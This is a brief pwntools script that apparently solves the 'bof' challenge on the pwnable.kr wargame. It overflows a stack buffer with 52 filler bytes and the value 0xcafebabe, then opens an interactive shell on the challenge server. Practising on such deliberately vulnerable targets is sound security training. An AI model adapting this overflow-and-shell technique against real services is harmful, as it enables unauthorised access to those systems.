#!/usr/bin/env python3
from pwn import *

REMOTE = True

if REMOTE:
    p = remote('pwnable.kr', 9000)
else:
    p = process("./bof")

#payload = "A"*52 + "\xbe\xba\xfe\xca"
payload = b"A"*52 + p32(0xcafebabe)

p.send(payload)
p.interactive()
